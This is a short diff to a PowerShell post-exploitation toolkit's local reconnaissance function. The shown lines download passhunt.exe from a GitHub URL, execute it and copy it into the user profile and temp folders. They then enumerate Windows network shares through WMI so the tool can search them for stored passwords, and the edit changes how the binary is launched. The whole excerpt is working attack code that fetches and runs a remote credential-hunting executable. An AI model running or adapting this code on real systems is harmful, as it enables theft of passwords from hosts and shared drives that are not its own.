@@ -325,12 +325,13 @@ function localreconmodules
             {
                 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                 Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
-                invoke-expression 'cmd /c start powershell -Command {.\passhunt.exe -o %TEMP%}'
+                copy .\passhunt.exe $Env:USERPROFILE
+                cmd /c start powershell -Command ".\passhunt.exe"
                 $sharepasshunt = Read-Host -Prompt 'Do you want to search for Passwords on this system using passhunt.exe? (Its worth it) (yes/no)'
                 if ($sharepasshunt -eq "yes" -or $sharepasshunt -eq "y" -or $sharepasshunt -eq "Yes" -or $sharepasshunt -eq "Y")
                 {
                     get-WmiObject -class Win32_Share | ft Path >> passhuntshares.txt
-                    $shares = get-content .\passhuntshares.txt | select-object -skip 5
+                    $shares = get-content .\passhuntshares.txt | select-object -skip 4
                     copy .\passhuntshares.txt $Env:TMP
                     copy .\passhunt.exe $Env:TMP
                     $temp = $Env:TMP
